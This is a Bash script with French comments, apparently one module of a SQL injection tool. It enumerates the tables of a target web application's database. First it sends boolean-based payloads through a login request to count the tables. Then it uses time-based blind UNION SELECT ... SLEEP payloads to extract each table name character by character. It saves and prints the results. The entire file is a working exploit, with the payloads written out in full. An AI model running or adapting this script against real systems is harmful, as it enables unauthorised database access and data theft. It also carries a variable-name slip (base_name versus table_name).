#!/bin/bash

# Chargement des configurations globales
source "$(dirname "${BASH_SOURCE[0]}")/../config/globals.sh"

# Stockage des résultats
declare -A FOUND_TABLES

# Fonction pour l'extraction des bases de données
extract_tables() {
    sql_log "INFO" "Démarrage de l'extraction des bases des tables"
    local count=0
    
    # Phase 1: Détection du nombre de bases
    sql_log "QUERY" "Détection du nombre de tables"
    for val in $(seq 1 $MAX_ATTEMPTS); do
        loading_animation "Test avec COUNT = $val"
        
        local payload="' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='$db')=${val};-- -"
        local response=$(send_request "$payload")
        local message=$(echo "$response" | jq -r '.message // empty')
        
        if [[ "$message" == *"Authentification réussie"* ]]; then
            count=$val
            sql_log "INFO" "Nombre de tables détecté : $count"
            break
        fi
        sleep $REQUEST_DELAY
    done

    if [[ $count -eq 0 ]]; then
        sql_log "ERROR" "Impossible de déterminer le nombre de tables"
        return 1
    fi

    # Phase 2: Extraction des noms
    for offset in $(seq 0 $((count - 1))); do
        sql_log "QUERY" "Extraction de la table $((offset + 1))/$count"
        local base_name=""

        for position in $(seq 1 $MAX_LENGTH); do
            local found=false

            for char in $(echo -n "$CHARSET" | sed 's/\(.\)/\1 /g'); do
                loading_animation "Test position $position avec '$char'"
                
                local injection="' UNION SELECT CASE WHEN (SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='$db' LIMIT 1 OFFSET ${offset}), ${position}, 1) = '${char}') THEN SLEEP(${THRESHOLD}) ELSE NULL END, NULL, NULL-- -"
                local duration=$(test_injection "$injection")

                if (( $(echo "$duration > $THRESHOLD" | bc -l) )); then
                    table_name+="$char"
                    sql_log "INFO" "Caractère trouvé: $char"
                    found=true
                    break
                fi
            done

            if [ "$found" = false ]; then
                break
            fi
            sleep $REQUEST_DELAY
        done

        if [ -n "$table_name" ]; then
            FOUND_TABLES[$offset]=$table_name
            sql_log "INFO" "Table $((offset + 1)) : $table_name"
        fi
    done

    # Sauvegarde des résultats
    save_tables_results
    
    # Affichage du résumé
    display_tables_summary
}

# Fonction pour sauvegarder les résultats
save_tables_results() {
    local result_file="tables_$(date '+%Y%m%d_%H%M%S').txt"
    {
        echo "Résultats de l'extraction des tables - $(date '+%Y-%m-%d %H:%M:%S')"
        echo "URL cible: $TARGET_URL"
        echo "----------------------------------------"
        echo "ID | Nom de la table"
        echo "----------------------------------------"
        for i in "${!FOUND_TABLES[@]}"; do
            echo "$((i + 1)) | ${FOUND_TABLES[$i]}"
        done
        echo "----------------------------------------"
        echo "Total: ${#FOUND_TABLES[@]} tables trouvées"
    } > "$result_file"

    sql_log "INFO" "Résultats sauvegardés dans $result_file"
}

# Fonction pour afficher le résumé
display_tables_summary() {
    echo -e "\n${BLUE}"
    echo "╔═══════════════════════════ TABLES═══════════ ═══════════════════════════╗"
    echo "║                                                                         ║"
    printf "║  %-3s │ %-55s ║\n" "ID" "Nom de la table"
    echo "║═════╪═════════════════════════════════════════════════════════════════║"
    
    for i in "${!FOUND_TABLES[@]}"; do
        printf "║  %-3d │ %-55s ║\n" "$((i + 1))" "${FOUND_TABLES[$i]}"
    done
    
    echo "║                                                                         ║"
    printf "║  Total: %-3d tables trouvées                                             ║\n" "${#FOUND_TABLES[@]}"
    echo "╚═════════════════════════════════════════════════════════════════════════╝"
    echo -e "${DEFAULT}"
}

# Si le script est exécuté directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Vérification que la configuration est chargée
    if [[ -z "$TARGET_URL" ]]; then
        echo "Erreur: Configuration non chargée"
        exit 1
    fi
    
    extract_tables
fi
